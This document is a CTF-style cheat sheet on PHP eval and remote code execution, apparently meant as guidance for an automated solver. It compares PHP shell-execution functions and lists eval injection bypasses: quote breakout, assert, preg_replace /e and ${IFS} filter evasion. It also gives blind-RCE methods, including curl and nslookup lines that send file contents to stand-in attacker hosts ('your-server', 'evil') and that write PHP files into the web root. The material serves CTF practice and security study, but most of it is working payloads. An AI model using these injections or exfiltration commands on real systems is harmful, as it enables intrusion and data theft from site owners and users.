# Comprehensive eval and RCE Techniques

## Comparison of PHP Code Execution Functions

| Function | Echo | Usage |
|------|------|------|
| `system($cmd)` | **Yes** (writes directly to stdout) | `system("id")` → result shown directly on the page |
| `passthru($cmd)` | **Yes** (raw binary output) | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **No** (stored in the `$out` array) | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **No** (returns a string) | `echo shell_exec("id")` |
| `` `$cmd` `` | **No** (equivalent to shell_exec) | `` echo `id` `` |
| `popen($cmd, 'r')` | **No** (requires fread) | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | Depends on the code | `eval("system('id');")` → echoes |

## highlight_file and eval Output Order

This is a common trap in CTFs:

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

**Key understanding**:
- `highlight_file()` outputs the highlighted source → this is step one
- The output of `system()` inside `eval()` → this is step two
- Both are in the **same HTTP response**, with the command result **after** the highlighted source
- The output of `system()` is written directly to stdout and is **not "blocked" by highlight_file**

**How to find the flag**:
- Look for the flag at the **end** of the HTTP response
- The HTML output of `highlight_file` is very long; the flag is usually at the very end
- Use `python_execute` to parse the response and look only at the last few hundred characters

```python
import requests
r = requests.get(url, params={"cmd": "system('cat flag.php');"})
# The flag is at the end of r.text, not in the highlighted-source part
print(r.text[-500:])  # Look only at the last 500 characters
```

## eval Bypass Techniques

### 1. Semicolon Bypass

```php
// If eval requires a semicolon but the input is filtered
eval($_GET['cmd']);  // Normal usage
// Pass: system('id')  // No semicolon needed, eval adds it automatically
// Or pass: system('id');// 
```

### 2. PHP Closing Tag

```php
// If the eval content is wrapped
eval("echo '" . $_GET['cmd'] . "';");
// Pass: ');system('id');//
// Result: eval("echo '');system('id');//';");
```

### 3. assert() Injection

```php
// assert() could execute code before PHP 7
assert("system('id')");  // PHP < 7.x
// In PHP 7+ assert became a language construct and no longer executes strings
```

### 4. preg_replace /e Modifier

```php
// In PHP < 7.0, preg_replace /e executes the replacement result
preg_replace('/test/e', 'system("id")', 'test');
// Arbitrary regex + /e + controllable replacement string → RCE
```

## Exploiting RCE Without Echo

### Method 1: Write a file to the web directory
```bash
system("cat flag.php > /var/www/html/x.txt");
# Then visit http://target/x.txt
```

### Method 2: DNS/HTTP exfiltration
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### Method 3: Write a PHP file and read it
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# Then visit http://target/read.php
```

### Method 4: Environment variable + another vulnerability
```bash
# Write the result into a cookie/session
system("export FLAG=$(cat flag.php)");
# Read it via phpinfo() or /proc/self/environ
```

## Building PHP Code Execution Chains

### Exploitation chains from simple to complex

1. **Direct execution**: `system("id")` → echoes
2. **No echo, write to file**: `system("cat flag.php > /var/www/html/x")`
3. **No echo, exfiltrate**: `system("curl http://evil/$(cat flag.php)")`
4. **No echo, blind injection**: `system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### Common CTF eval Scenarios

| Scenario | Code pattern | Bypass method |
|------|---------|---------|
| Simple eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + space filter | `eval($cmd)` + spaces replaced | `system('cat${IFS}flag.php')` |
| eval + keyword filter | `eval($cmd)` + flag replaced | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | Look at the **end of the page** |
| eval + length limit | `strlen($cmd) > N` | Use variables / short function names |
| assert injection | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | Inject code in the replacement string |
